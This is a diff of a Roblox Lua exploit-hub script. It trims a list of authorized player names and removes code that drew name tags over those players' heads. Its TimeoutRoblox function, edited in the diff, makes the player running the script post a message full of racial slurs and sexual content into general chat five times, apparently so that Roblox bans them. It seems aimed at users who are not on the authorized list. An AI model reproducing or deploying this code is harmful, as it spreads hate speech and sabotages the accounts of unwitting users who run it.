@@ -3,73 +3,11 @@ local TextChatService = game:GetService("TextChatService")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
---// Autorizados e tags
-local Autorizados = {
-    ["Breno010L"] = "Dono Do KitK4t Hub",
-    ["Gabriel263633j"] = "Sub Dono Do KitK4t Hub",
-    ["shawnlovebazuka"] = "Sub Dona Do KitK4t Hub",
-    ["saitama9rsm"] = "Moderador",
-    ["Nickaq"] = "Moderador",
-    ["nickaq"] = "Moderador",
-    ["nickaq"] = "Moderador",
-    ["nickaq"] = "Moderador"
+-- Lista de jogadores autorizados
+local AUTHORIZED_PLAYERS = {
+    "Breno010L",
+    "shawnlovebazuka"
 }
-
---// Jogadores ativos (quem está usando o script)
-local JogadoresAtivos = {}
-JogadoresAtivos[LocalPlayer.Name:lower()] = true
-
---// Cria tag acima da cabeça
-local function createSpecialTag(player, tagText)
-    local function apply()
-        local char = player.Character
-        if not char then return end
-        local head = char:FindFirstChild("Head")
-        if not head then return end
-
-        local old = head:FindFirstChild("SpecialTag")
-        if old then old:Destroy() end
-
-        local gui = Instance.new("BillboardGui")
-        gui.Name = "SpecialTag"
-        gui.Size = UDim2.new(0, 200, 0, 50)
-        gui.StudsOffset = Vector3.new(0, 3, 0)
-        gui.AlwaysOnTop = true
-        gui.Adornee = head
-        gui.Parent = head
-
-        local text = Instance.new("TextLabel")
-        text.Size = UDim2.new(1, 0, 1, 0)
-        text.BackgroundTransparency = 1
-        text.Text = tagText
-        text.TextColor3 = Color3.fromRGB(255, 255, 255)
-        text.Font = Enum.Font.GothamBold
-        text.TextScaled = true
-        text.TextStrokeTransparency = 0.2
-        text.TextStrokeColor3 = Color3.new(0, 0, 0)
-        text.Parent = gui
-    end
-    apply()
-    player.CharacterAdded:Connect(function()
-        task.wait(0.5)
-        apply()
-    end)
-end
-
---// Aplica tags para todos os autorizados (visíveis para quem usar o script)
-for name, tag in pairs(Autorizados) do
-    local p = Players:FindFirstChild(name)
-    if p then
-        createSpecialTag(p, tag)
-    end
-end
-
-Players.PlayerAdded:Connect(function(p)
-    if Autorizados[p.Name] then
-        task.wait(1)
-        createSpecialTag(p, Autorizados[p.Name])
-    end
-end)
 
 -- Função para verificar se o jogador está autorizado
 local function IsPlayerAuthorized()
@@ -213,7 +151,7 @@ local function TimeoutRoblox()
         local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
         for i = 1, 5 do
             if channel then 
-                channel:SendAsync("NIGGA NIGGA CUM GAY, ROBLOX ASS ME GIVE, I AM OWNER OF KIDS I AM NIGGA AND RACIST, ROBLOX BAN ME") 
+                channel:SendAsync("NIGGA NIGGA CUM GAY, ROBLOX ASS ME GIVE, I AM OWNER OF KIDS I AM NIGGA E SOU RACISTA, ROBLOX ME BANE") 
             end
             task.wait(0.1)
         end
